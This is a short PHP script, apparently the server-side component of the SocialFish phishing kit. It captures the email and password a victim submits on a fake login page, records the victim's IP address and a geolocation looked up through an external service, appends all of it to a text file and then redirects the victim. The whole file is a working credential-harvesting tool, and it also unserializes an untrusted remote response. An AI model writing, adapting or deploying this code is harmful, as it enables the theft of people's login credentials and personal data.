<?php
$var = $_POST['email'];
$var2 = $_POST['pass'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))   
    {
      $remote = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
    {
      $remote = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $remote = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$remote"));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>There's a Phishing Page generated by SocialFish in this website.</title></html>";
if($myFile == $searchString) {
    file_put_contents("cat.txt", " <user>: " . $var . "\n  <pass>: " . $var2 . "\n  <ip>: " . $remote . "  <country>: " . $country . "\n  <city>: " . $city . "\n", FILE_APPEND);
    header('Location: <CUST0M>');
}
if($myFile != $searchString) {
    echo "***ALERT! I AM A FAKE PAGE | DO NOT TRUST ME";
}
exit();
?>